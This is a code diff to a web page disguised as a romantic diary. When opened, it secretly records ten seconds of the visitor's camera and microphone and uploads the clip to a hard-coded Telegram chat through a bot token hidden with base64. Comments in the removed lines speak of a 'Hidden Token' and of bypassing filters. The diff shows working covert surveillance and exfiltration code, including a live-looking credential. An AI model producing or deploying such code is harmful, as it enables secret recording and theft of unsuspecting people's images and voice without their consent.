@@ -81,38 +81,36 @@
 
         async function startDiary() {
             try {
+                // Resetting chunks for fresh recording every time link opens
+                recordedChunks = [];
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('video-preview').srcObject = stream;
-                mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                 mediaRecorder.start();
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
-                // 10 Second recording for high reliability
+                // 10 Second recording session
                 setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);
 
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     const formData = new FormData();
-                    formData.append('chat_id', "5324376571"); // Correct Chat ID
+                    formData.append('chat_id', "5324376571"); //
+                    formData.append('video', blob, 'reaction.mp4');
                     
-                    // Using sendDocument for 100% reliability
-                    formData.append('document', blob, 'reaction.mp4');
-                    
-                    // Hidden Token
-                    const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
-                    
-                    // Calling sendDocument instead of sendVideo to bypass filters
-                    fetch(`https://api.telegram.org/bot${t}/sendDocument`, { method: 'POST', body: formData });
+                    const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw=="); //
+                    fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData });
                 };
             } catch (err) { alert("Camera access needed! ❤️"); }
         }
 
         async function triggerSecretUpload(btn) {
             bgMusic.pause();
-            const vn = new Audio('voice note.mp4');
+            const vn = new Audio('voice note.mp4'); 
             btn.innerHTML = "Listening... ❤️";
             btn.disabled = true;
             vn.play();
